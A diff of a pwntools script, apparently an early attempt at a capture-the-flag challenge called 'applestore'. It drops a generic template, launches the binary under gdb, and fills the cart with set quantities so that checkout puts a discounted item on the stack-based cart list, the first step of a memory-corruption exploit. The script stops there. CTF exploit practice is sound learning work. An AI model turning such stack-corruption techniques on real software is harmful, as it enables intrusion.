@@ -2,31 +2,30 @@
 
 from pwn import *
 
-exe = ELF("applestore_patched")
 libc = ELF("libc.so.6")
 ld = ELF("./ld-2.23.so")
 
-context.binary = exe
+p = gdb.debug('./applestore_patched', gdbscript='''
+b main
+b checkout
+continue
+''')
+#p = process('./applestore_patched')
 
+def add_item(item):
+	p.sendlineafter(b'> ', b'2')
+	p.sendlineafter(b'Device Number> ', item)
 
-def conn():
-    if args.LOCAL:
-        r = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r)
-    else:
-        r = remote("addr", 1337)
+# add 6 x iphone 6 - 199
+for i in range (6):
+	add_item(b'1')
 
-    return r
+# add 20 x iphone 6 plus - 299
+for i in range(20):
+	add_item(b'2')
 
+# checkout (this adds our $1 iphone to myCart linked list on the stack) 
+p.sendlineafter(b'> ', b'5')
+p.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y')
 
-def main():
-    r = conn()
-
-    # good luck pwning :)
-
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
+p.interactive()
